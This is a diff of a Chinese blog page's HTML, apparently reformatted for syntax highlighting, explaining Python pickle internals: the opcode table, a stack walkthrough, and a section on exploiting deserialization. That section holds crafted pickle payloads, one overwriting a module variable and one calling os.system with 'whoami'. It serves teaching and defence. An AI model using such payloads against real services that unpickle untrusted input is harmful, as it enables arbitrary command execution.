@@ -398,14 +398,14 @@ dump
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.4k
+                    3.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    15 分
+                    14 分
                 </div>
                 
 
@@ -495,99 +495,99 @@ test2 <span class="token operator">=</span> Test2<span class="token punctuation"
 <p>字节码，如果python有写入的权限，那么会生成一个 .pyc 的字节码文件，若没有那就再内存中生成字节码，程序结束后丢弃。</p>
 <p>在上图中字符串 s 是一串指令，学名叫PVM指令。</p>
 <p>PVM指令集，用的时候可以查，在pickle库里</p>
-<pre><code># Pickle opcodes.  See pickletools.py for extensive docs.  The listing
-# here is in kind-of alphabetical order of 1-character pickle code.
-# pickletools groups them by purpose.
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span>
+<span class="token comment" spellcheck="true"># here is in kind-of alphabetical order of 1-character pickle code.</span>
+<span class="token comment" spellcheck="true"># pickletools groups them by purpose.</span>
 
-MARK           = b&#39;(&#39;   # push special markobject on stack
-STOP           = b&#39;.&#39;   # every pickle ends with STOP
-POP            = b&#39;0&#39;   # discard topmost stack item
-POP_MARK       = b&#39;1&#39;   # discard stack top through topmost markobject
-DUP            = b&#39;2&#39;   # duplicate top stack item
-FLOAT          = b&#39;F&#39;   # push float object; decimal string argument
-INT            = b&#39;I&#39;   # push integer or bool; decimal string argument
-BININT         = b&#39;J&#39;   # push four-byte signed int
-BININT1        = b&#39;K&#39;   # push 1-byte unsigned int
-LONG           = b&#39;L&#39;   # push long; decimal string argument
-BININT2        = b&#39;M&#39;   # push 2-byte unsigned int
-NONE           = b&#39;N&#39;   # push None
-PERSID         = b&#39;P&#39;   # push persistent object; id is taken from string arg
-BINPERSID      = b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
-REDUCE         = b&#39;R&#39;   # apply callable to argtuple, both on stack
-STRING         = b&#39;S&#39;   # push string; NL-terminated string argument
-BINSTRING      = b&#39;T&#39;   # push string; counted binary string argument
-SHORT_BINSTRING= b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
-UNICODE        = b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argument
-BINUNICODE     = b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
-APPEND         = b&#39;a&#39;   # append stack top to list below it
-BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()
-GLOBAL         = b&#39;c&#39;   # push self.find_class(modname, name); 2 string args
-DICT           = b&#39;d&#39;   # build a dict from stack items
-EMPTY_DICT     = b&#39;&#125;&#39;   # push empty dict
-APPENDS        = b&#39;e&#39;   # extend list on stack by topmost stack slice
-GET            = b&#39;g&#39;   # push item from memo on stack; index is string arg
-BINGET         = b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
-INST           = b&#39;i&#39;   # build &amp; push class instance
-LONG_BINGET    = b&#39;j&#39;   # push item from memo on stack; index is 4-byte arg
-LIST           = b&#39;l&#39;   # build list from topmost stack items
-EMPTY_LIST     = b&#39;]&#39;   # push empty list
-OBJ            = b&#39;o&#39;   # build &amp; push class instance
-PUT            = b&#39;p&#39;   # store stack top in memo; index is string arg
-BINPUT         = b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
-LONG_BINPUT    = b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
-SETITEM        = b&#39;s&#39;   # add key+value pair to dict
-TUPLE          = b&#39;t&#39;   # build tuple from topmost stack items
-EMPTY_TUPLE    = b&#39;)&#39;   # push empty tuple
-SETITEMS       = b&#39;u&#39;   # modify dict by adding topmost key+value pairs
-BINFLOAT       = b&#39;G&#39;   # push float; arg is 8-byte float encoding
+MARK           <span class="token operator">=</span> b<span class="token string">'('</span>   <span class="token comment" spellcheck="true"># push special markobject on stack</span>
+STOP           <span class="token operator">=</span> b<span class="token string">'.'</span>   <span class="token comment" spellcheck="true"># every pickle ends with STOP</span>
+POP            <span class="token operator">=</span> b<span class="token string">'0'</span>   <span class="token comment" spellcheck="true"># discard topmost stack item</span>
+POP_MARK       <span class="token operator">=</span> b<span class="token string">'1'</span>   <span class="token comment" spellcheck="true"># discard stack top through topmost markobject</span>
+DUP            <span class="token operator">=</span> b<span class="token string">'2'</span>   <span class="token comment" spellcheck="true"># duplicate top stack item</span>
+FLOAT          <span class="token operator">=</span> b<span class="token string">'F'</span>   <span class="token comment" spellcheck="true"># push float object; decimal string argument</span>
+INT            <span class="token operator">=</span> b<span class="token string">'I'</span>   <span class="token comment" spellcheck="true"># push integer or bool; decimal string argument</span>
+BININT         <span class="token operator">=</span> b<span class="token string">'J'</span>   <span class="token comment" spellcheck="true"># push four-byte signed int</span>
+BININT1        <span class="token operator">=</span> b<span class="token string">'K'</span>   <span class="token comment" spellcheck="true"># push 1-byte unsigned int</span>
+LONG           <span class="token operator">=</span> b<span class="token string">'L'</span>   <span class="token comment" spellcheck="true"># push long; decimal string argument</span>
+BININT2        <span class="token operator">=</span> b<span class="token string">'M'</span>   <span class="token comment" spellcheck="true"># push 2-byte unsigned int</span>
+NONE           <span class="token operator">=</span> b<span class="token string">'N'</span>   <span class="token comment" spellcheck="true"># push None</span>
+PERSID         <span class="token operator">=</span> b<span class="token string">'P'</span>   <span class="token comment" spellcheck="true"># push persistent object; id is taken from string arg</span>
+BINPERSID      <span class="token operator">=</span> b<span class="token string">'Q'</span>   <span class="token comment" spellcheck="true">#  "       "         "  ;  "  "   "     "  stack</span>
+REDUCE         <span class="token operator">=</span> b<span class="token string">'R'</span>   <span class="token comment" spellcheck="true"># apply callable to argtuple, both on stack</span>
+STRING         <span class="token operator">=</span> b<span class="token string">'S'</span>   <span class="token comment" spellcheck="true"># push string; NL-terminated string argument</span>
+BINSTRING      <span class="token operator">=</span> b<span class="token string">'T'</span>   <span class="token comment" spellcheck="true"># push string; counted binary string argument</span>
+SHORT_BINSTRING<span class="token operator">=</span> b<span class="token string">'U'</span>   <span class="token comment" spellcheck="true">#  "     "   ;    "      "       "      " &lt; 256 bytes</span>
+UNICODE        <span class="token operator">=</span> b<span class="token string">'V'</span>   <span class="token comment" spellcheck="true"># push Unicode string; raw-unicode-escaped'd argument</span>
+BINUNICODE     <span class="token operator">=</span> b<span class="token string">'X'</span>   <span class="token comment" spellcheck="true">#   "     "       "  ; counted UTF-8 string argument</span>
+APPEND         <span class="token operator">=</span> b<span class="token string">'a'</span>   <span class="token comment" spellcheck="true"># append stack top to list below it</span>
+BUILD          <span class="token operator">=</span> b<span class="token string">'b'</span>   <span class="token comment" spellcheck="true"># call __setstate__ or __dict__.update()</span>
+GLOBAL         <span class="token operator">=</span> b<span class="token string">'c'</span>   <span class="token comment" spellcheck="true"># push self.find_class(modname, name); 2 string args</span>
+DICT           <span class="token operator">=</span> b<span class="token string">'d'</span>   <span class="token comment" spellcheck="true"># build a dict from stack items</span>
+EMPTY_DICT     <span class="token operator">=</span> b<span class="token string">'&amp;#125;'</span>   # push empty dict
+APPENDS        <span class="token operator">=</span> b<span class="token string">'e'</span>   <span class="token comment" spellcheck="true"># extend list on stack by topmost stack slice</span>
+GET            <span class="token operator">=</span> b<span class="token string">'g'</span>   <span class="token comment" spellcheck="true"># push item from memo on stack; index is string arg</span>
+BINGET         <span class="token operator">=</span> b<span class="token string">'h'</span>   <span class="token comment" spellcheck="true">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span>
+INST           <span class="token operator">=</span> b<span class="token string">'i'</span>   <span class="token comment" spellcheck="true"># build &amp; push class instance</span>
+LONG_BINGET    <span class="token operator">=</span> b<span class="token string">'j'</span>   <span class="token comment" spellcheck="true"># push item from memo on stack; index is 4-byte arg</span>
+LIST           <span class="token operator">=</span> b<span class="token string">'l'</span>   <span class="token comment" spellcheck="true"># build list from topmost stack items</span>
+EMPTY_LIST     <span class="token operator">=</span> b<span class="token string">']'</span>   <span class="token comment" spellcheck="true"># push empty list</span>
+OBJ            <span class="token operator">=</span> b<span class="token string">'o'</span>   <span class="token comment" spellcheck="true"># build &amp; push class instance</span>
+PUT            <span class="token operator">=</span> b<span class="token string">'p'</span>   <span class="token comment" spellcheck="true"># store stack top in memo; index is string arg</span>
+BINPUT         <span class="token operator">=</span> b<span class="token string">'q'</span>   <span class="token comment" spellcheck="true">#   "     "    "   "   " ;   "    " 1-byte arg</span>
+LONG_BINPUT    <span class="token operator">=</span> b<span class="token string">'r'</span>   <span class="token comment" spellcheck="true">#   "     "    "   "   " ;   "    " 4-byte arg</span>
+SETITEM        <span class="token operator">=</span> b<span class="token string">'s'</span>   <span class="token comment" spellcheck="true"># add key+value pair to dict</span>
+TUPLE          <span class="token operator">=</span> b<span class="token string">'t'</span>   <span class="token comment" spellcheck="true"># build tuple from topmost stack items</span>
+EMPTY_TUPLE    <span class="token operator">=</span> b<span class="token string">')'</span>   <span class="token comment" spellcheck="true"># push empty tuple</span>
+SETITEMS       <span class="token operator">=</span> b<span class="token string">'u'</span>   <span class="token comment" spellcheck="true"># modify dict by adding topmost key+value pairs</span>
+BINFLOAT       <span class="token operator">=</span> b<span class="token string">'G'</span>   <span class="token comment" spellcheck="true"># push float; arg is 8-byte float encoding</span>
 
-TRUE           = b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.py
-FALSE          = b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py
+TRUE           <span class="token operator">=</span> b<span class="token string">'I01\n'</span>  <span class="token comment" spellcheck="true"># not an opcode; see INT docs in pickletools.py</span>
+FALSE          <span class="token operator">=</span> b<span class="token string">'I00\n'</span>  <span class="token comment" spellcheck="true"># not an opcode; see INT docs in pickletools.py</span>
 
-# Protocol 2
+<span class="token comment" spellcheck="true"># Protocol 2</span>
 
-PROTO          = b&#39;\x80&#39;  # identify pickle protocol
-NEWOBJ         = b&#39;\x81&#39;  # build object by applying cls.__new__ to argtuple
-EXT1           = b&#39;\x82&#39;  # push object from extension registry; 1-byte index
-EXT2           = b&#39;\x83&#39;  # ditto, but 2-byte index
-EXT4           = b&#39;\x84&#39;  # ditto, but 4-byte index
-TUPLE1         = b&#39;\x85&#39;  # build 1-tuple from stack top
-TUPLE2         = b&#39;\x86&#39;  # build 2-tuple from two topmost stack items
-TUPLE3         = b&#39;\x87&#39;  # build 3-tuple from three topmost stack items
-NEWTRUE        = b&#39;\x88&#39;  # push True
-NEWFALSE       = b&#39;\x89&#39;  # push False
-LONG1          = b&#39;\x8a&#39;  # push long from &lt; 256 bytes
-LONG4          = b&#39;\x8b&#39;  # push really big long
+PROTO          <span class="token operator">=</span> b<span class="token string">'\x80'</span>  <span class="token comment" spellcheck="true"># identify pickle protocol</span>
+NEWOBJ         <span class="token operator">=</span> b<span class="token string">'\x81'</span>  <span class="token comment" spellcheck="true"># build object by applying cls.__new__ to argtuple</span>
+EXT1           <span class="token operator">=</span> b<span class="token string">'\x82'</span>  <span class="token comment" spellcheck="true"># push object from extension registry; 1-byte index</span>
+EXT2           <span class="token operator">=</span> b<span class="token string">'\x83'</span>  <span class="token comment" spellcheck="true"># ditto, but 2-byte index</span>
+EXT4           <span class="token operator">=</span> b<span class="token string">'\x84'</span>  <span class="token comment" spellcheck="true"># ditto, but 4-byte index</span>
+TUPLE1         <span class="token operator">=</span> b<span class="token string">'\x85'</span>  <span class="token comment" spellcheck="true"># build 1-tuple from stack top</span>
+TUPLE2         <span class="token operator">=</span> b<span class="token string">'\x86'</span>  <span class="token comment" spellcheck="true"># build 2-tuple from two topmost stack items</span>
+TUPLE3         <span class="token operator">=</span> b<span class="token string">'\x87'</span>  <span class="token comment" spellcheck="true"># build 3-tuple from three topmost stack items</span>
+NEWTRUE        <span class="token operator">=</span> b<span class="token string">'\x88'</span>  <span class="token comment" spellcheck="true"># push True</span>
+NEWFALSE       <span class="token operator">=</span> b<span class="token string">'\x89'</span>  <span class="token comment" spellcheck="true"># push False</span>
+LONG1          <span class="token operator">=</span> b<span class="token string">'\x8a'</span>  <span class="token comment" spellcheck="true"># push long from &lt; 256 bytes</span>
+LONG4          <span class="token operator">=</span> b<span class="token string">'\x8b'</span>  <span class="token comment" spellcheck="true"># push really big long</span>
 
-_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]
+_tuplesize2code <span class="token operator">=</span> <span class="token punctuation">[</span>EMPTY_TUPLE<span class="token punctuation">,</span> TUPLE1<span class="token punctuation">,</span> TUPLE2<span class="token punctuation">,</span> TUPLE3<span class="token punctuation">]</span>
 
-# Protocol 3 (Python 3.x)
+<span class="token comment" spellcheck="true"># Protocol 3 (Python 3.x)</span>
 
-BINBYTES       = b&#39;B&#39;   # push bytes; counted binary string argument
-SHORT_BINBYTES = b&#39;C&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
+BINBYTES       <span class="token operator">=</span> b<span class="token string">'B'</span>   <span class="token comment" spellcheck="true"># push bytes; counted binary string argument</span>
+SHORT_BINBYTES <span class="token operator">=</span> b<span class="token string">'C'</span>   <span class="token comment" spellcheck="true">#  "     "   ;    "      "       "      " &lt; 256 bytes</span>
 
-# Protocol 4
+<span class="token comment" spellcheck="true"># Protocol 4</span>
 
-SHORT_BINUNICODE = b&#39;\x8c&#39;  # push short string; UTF-8 length &lt; 256 bytes
-BINUNICODE8      = b&#39;\x8d&#39;  # push very long string
-BINBYTES8        = b&#39;\x8e&#39;  # push very long bytes string
-EMPTY_SET        = b&#39;\x8f&#39;  # push empty set on the stack
-ADDITEMS         = b&#39;\x90&#39;  # modify set by adding topmost stack items
-FROZENSET        = b&#39;\x91&#39;  # build frozenset from topmost stack items
-NEWOBJ_EX        = b&#39;\x92&#39;  # like NEWOBJ but work with keyword only arguments
-STACK_GLOBAL     = b&#39;\x93&#39;  # same as GLOBAL but using names on the stacks
-MEMOIZE          = b&#39;\x94&#39;  # store top of the stack in memo
-FRAME            = b&#39;\x95&#39;  # indicate the beginning of a new frame
+SHORT_BINUNICODE <span class="token operator">=</span> b<span class="token string">'\x8c'</span>  <span class="token comment" spellcheck="true"># push short string; UTF-8 length &lt; 256 bytes</span>
+BINUNICODE8      <span class="token operator">=</span> b<span class="token string">'\x8d'</span>  <span class="token comment" spellcheck="true"># push very long string</span>
+BINBYTES8        <span class="token operator">=</span> b<span class="token string">'\x8e'</span>  <span class="token comment" spellcheck="true"># push very long bytes string</span>
+EMPTY_SET        <span class="token operator">=</span> b<span class="token string">'\x8f'</span>  <span class="token comment" spellcheck="true"># push empty set on the stack</span>
+ADDITEMS         <span class="token operator">=</span> b<span class="token string">'\x90'</span>  <span class="token comment" spellcheck="true"># modify set by adding topmost stack items</span>
+FROZENSET        <span class="token operator">=</span> b<span class="token string">'\x91'</span>  <span class="token comment" spellcheck="true"># build frozenset from topmost stack items</span>
+NEWOBJ_EX        <span class="token operator">=</span> b<span class="token string">'\x92'</span>  <span class="token comment" spellcheck="true"># like NEWOBJ but work with keyword only arguments</span>
+STACK_GLOBAL     <span class="token operator">=</span> b<span class="token string">'\x93'</span>  <span class="token comment" spellcheck="true"># same as GLOBAL but using names on the stacks</span>
+MEMOIZE          <span class="token operator">=</span> b<span class="token string">'\x94'</span>  <span class="token comment" spellcheck="true"># store top of the stack in memo</span>
+FRAME            <span class="token operator">=</span> b<span class="token string">'\x95'</span>  <span class="token comment" spellcheck="true"># indicate the beginning of a new frame</span>
 
-# Protocol 5
+<span class="token comment" spellcheck="true"># Protocol 5</span>
 
-BYTEARRAY8       = b&#39;\x96&#39;  # push bytearray
-NEXT_BUFFER      = b&#39;\x97&#39;  # push next out-of-band buffer
-READONLY_BUFFER  = b&#39;\x98&#39;  # make top of stack readonly
+BYTEARRAY8       <span class="token operator">=</span> b<span class="token string">'\x96'</span>  <span class="token comment" spellcheck="true"># push bytearray</span>
+NEXT_BUFFER      <span class="token operator">=</span> b<span class="token string">'\x97'</span>  <span class="token comment" spellcheck="true"># push next out-of-band buffer</span>
+READONLY_BUFFER  <span class="token operator">=</span> b<span class="token string">'\x98'</span>  <span class="token comment" spellcheck="true"># make top of stack readonly</span>
 </code></pre>
 <p>列出几个比较重要的操作码：</p>
 <blockquote>
-<pre><code>c : 读取本行的内容作为模块名module, 读取下一行的内容作为对象名object，然后将 module.object 作为可调用对象压入到栈中
+<pre class=" language-text"><code class="language-text">c : 读取本行的内容作为模块名module, 读取下一行的内容作为对象名object，然后将 module.object 作为可调用对象压入到栈中
 
 ( : 将一个标记对象压入到栈中 , 用于确定命令执行的位置，该标记常常搭配 t 指令一起使用 , 以便产生一个元组
 
@@ -621,34 +621,34 @@ s <span class="token operator">=</span> pickletools<span class="token punctuatio
 pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
 <span class="token comment" spellcheck="true">#反汇编</span>
 </code></pre>
-<pre><code>b&#39;\x80\x03c__main__\nTest1\n)\x81&#125;X\x04\x00\x00\x00dataX\x04\x00\x00\x00leessb.&#39;
+<pre class=" language-text"><code class="language-text">b'\x80\x03c__main__\nTest1\n)\x81&#125;X\x04\x00\x00\x00dataX\x04\x00\x00\x00leessb.'
 </code></pre>
 <p>\x80–接收pickle的版本，这里为\x03</p>
 <p>c–读取一行作为模块名__main__，再读取一行作为类名Test1，再通过find_class()获取到Test1对象，并压入stack栈</p>
-<pre><code>stack:[&lt;class &#39;__main__.Test1&#39;&gt;]
+<pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>]
 </code></pre>
 <p>)–压入一个空元组到stack栈中</p>
-<pre><code>stack:[&lt;class &#39;__main__.Test1&#39;&gt;,()]
+<pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>,()]
 </code></pre>
 <p>\x81–从栈弹出两个数据，()赋值给args，&lt;class ‘__main__.Test1’&gt;赋值给cls，再通过<a target="_blank" rel="noopener" href="https://blog.csdn.net/claroja/article/details/107056407">__new__()</a>实例化对象，并压入stack栈中</p>
-<pre><code>stack:[&lt;class &#39;__main__.Test1&#39;&gt;]
+<pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>]
 </code></pre>
 <p>}–压入一个空字典到栈里</p>
-<pre><code>stack:[&lt;class &#39;__main__.Test1&#39;&gt;,&#123;&#125;]
+<pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>,&#123;&#125;]
 </code></pre>
 <p>X–接收字符串的长度，这里为\x04\x00\x00\x00接收到data，\x04\x00\x00\x00接收到lees，都存入栈中</p>
-<pre><code>stack:[&lt;class &#39;__main__.Test1&#39;&gt;,&#123;&#125;,data,lees]
+<pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>,&#123;&#125;,data,lees]
 </code></pre>
 <p>s–弹出两个数据，存入那个空字典中，并压入栈</p>
-<pre><code>stack:[&lt;class &#39;__main__.Test1&#39;&gt;,&#123;&#39;data&#39;:&#39;lees&#39;&#125;]
+<pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>,&#123;'data':'lees'&#125;]
 </code></pre>
 <p>b–弹出 {‘data’:’lees’} 给state，弹出 &lt;class ‘__main__.Test1’&gt; 给inst，如果inst中存在__setstate__方法，则直接用<a target="_blank" rel="noopener" href="https://blog.csdn.net/jiang_huixin/article/details/109674221">setstate</a>来处理state，setstate(state)，如果不存在，则直接将state存入inst.__dict__中。</p>
-<pre><code>stack:[]
+<pre class=" language-text"><code class="language-text">stack:[]
 </code></pre>
 <p>.–结束反序列化。</p>
 <h2 id="反序列化漏洞利用"><a href="#反序列化漏洞利用" class="headerlink" title="反序列化漏洞利用"></a>反序列化漏洞利用</h2><p>从上面的例子可以看出反序列化的过程完全可控，因此我们可以构造pickle，我们可以根据实例来理解构造的payload。</p>
 <h3 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__()"></a>__reduce__()</h3><p>python序列化主要有三个过程：从对象中提取所有属性——》写入对象的所有模块名和类名——》写入对象所有属性的键值对。python反序列化漏洞的产生和php的魔术方法有异曲同工之处，在Python2中的 __reduce__() 方法，会在每次的反序列化开始或结束时调用。它的指令码是<code>R</code>。</p>
-<pre><code>__reduce__()方法
+<pre class=" language-test"><code class="language-test">__reduce__()方法
 
 在新式类中生效，不带参数，应返回字符串或一个元组。
 
@@ -674,120 +674,120 @@ test <span class="token operator">=</span> pickle<span class="token punctuation"
 <span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">)</span>
 </code></pre>
 <p>（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了）</p>
-<h3 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h3><pre><code>import pickle
-import secret
-class Test1:
-    def __init__(self):
-        self.animal=&quot;lees&quot;
-    def check(self):
-        if self.animal==secret.best:
-            print(&quot;good!&quot;)
+<h3 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> secret
+<span class="token keyword">class</span> <span class="token class-name">Test1</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>animal<span class="token operator">=</span><span class="token string">"lees"</span>
+    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>animal<span class="token operator">==</span>secret<span class="token punctuation">.</span>best<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"good!"</span><span class="token punctuation">)</span>
 
-code=&quot;your code&quot;
-pickle.loads(code)
+code<span class="token operator">=</span><span class="token string">"your code"</span>
+pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
 </code></pre>
 <p>在这个例子中，我们是不知道secret模块的，但在Test1类中有要进行判断才能输出good，所以我们只要修改secret的best为lees即可。我们导入一个模块会进入内存，然后我们在内存重构secret使之等于lees。</p>
 <p>c操作符调用find_class()来获取对象，而模块、属性都可控，那可以构造payload为：</p>
-<pre><code>code=b&#39;\x80\x03c__main__\nsecret\n&#125;X\x04\x00\x00\x00bestX\x04\x00\x00\x00leessb0c__main__\nTest1\n)\x81&#125;X\x04\x00\x00\x00nameX\x04\x00\x00\x00leessb.&#39;
+<pre class=" language-text"><code class="language-text">code=b'\x80\x03c__main__\nsecret\n&#125;X\x04\x00\x00\x00bestX\x04\x00\x00\x00leessb0c__main__\nTest1\n)\x81&#125;X\x04\x00\x00\x00nameX\x04\x00\x00\x00leessb.'
 </code></pre>
 <h3 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h3><p>与函数执行的操作码有<code>i、R、o、b</code></p>
 <ul>
 <li>i操作码</li>
 </ul>
-<pre><code>def load_inst(self):
-    module = self.readline()[:-1].decode(&quot;ascii&quot;)
-    name = self.readline()[:-1].decode(&quot;ascii&quot;)
-    klass = self.find_class(module, name)
-    self._instantiate(klass, self.pop_mark())
-dispatch[INST[0]] = load_inst
-#通过find_class获取方法（os.system），再通过pop_mark获得参数（whomai），并通过_instantiate来执行
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_inst</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    module <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>
+    name <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>
+    klass <span class="token operator">=</span> self<span class="token punctuation">.</span>find_class<span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+    self<span class="token punctuation">.</span>_instantiate<span class="token punctuation">(</span>klass<span class="token punctuation">,</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+dispatch<span class="token punctuation">[</span>INST<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_inst
+<span class="token comment" spellcheck="true">#通过find_class获取方法（os.system），再通过pop_mark获得参数（whomai），并通过_instantiate来执行</span>
 </code></pre>
-<pre><code>def pop_mark(self):
-    items = self.stack
-    self.stack = self.metastack.pop()
-    self.append = self.stack.append
-    return items
-#获取stack栈所有为item，然后弹出metastack栈赋值给stack栈，返回item
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pop_mark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    items <span class="token operator">=</span> self<span class="token punctuation">.</span>stack
+    self<span class="token punctuation">.</span>stack <span class="token operator">=</span> self<span class="token punctuation">.</span>metastack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append
+    <span class="token keyword">return</span> items
+<span class="token comment" spellcheck="true">#获取stack栈所有为item，然后弹出metastack栈赋值给stack栈，返回item</span>
 </code></pre>
-<pre><code>def load_mark(self):
-    self.metastack.append(self.stack)
-    self.stack = []
-    self.append = self.stack.append
-dispatch[MARK[0]] = load_mark
-# ( 操作符
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_mark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    self<span class="token punctuation">.</span>metastack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">)</span>
+    self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append
+dispatch<span class="token punctuation">[</span>MARK<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_mark
+<span class="token comment" spellcheck="true"># ( 操作符</span>
 </code></pre>
 <p>payload:</p>
-<pre><code>b&#39;(X\x06\x00\x00\x00whoamiios\nsystem\n.&#39;
+<pre class=" language-text"><code class="language-text">b'(X\x06\x00\x00\x00whoamiios\nsystem\n.'
 利用 ( 先将whoami存到metastack栈中，在执行 i 操作
 </code></pre>
 <ul>
 <li>R操作码</li>
 </ul>
-<pre><code>def load_reduce(self):
-    stack = self.stack
-    args = stack.pop()
-    func = stack[-1]
-    stack[-1] = func(*args)
-dispatch[REDUCE[0]] = load_reduce
-#弹出一个数据作为参数（必须是元组），当前stack栈最后一个数据作为函数并执行
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_reduce</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack
+    args <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    func <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+    stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>
+dispatch<span class="token punctuation">[</span>REDUCE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_reduce
+<span class="token comment" spellcheck="true">#弹出一个数据作为参数（必须是元组），当前stack栈最后一个数据作为函数并执行</span>
 </code></pre>
-<pre><code>def load_tuple1(self):
-    self.stack[-1] = (self.stack[-1],)
-dispatch[TUPLE1[0]] = load_tuple1
-#\x85将最后一个数据改成元组形式并压到stack栈
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_tuple1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
+dispatch<span class="token punctuation">[</span>TUPLE1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_tuple1
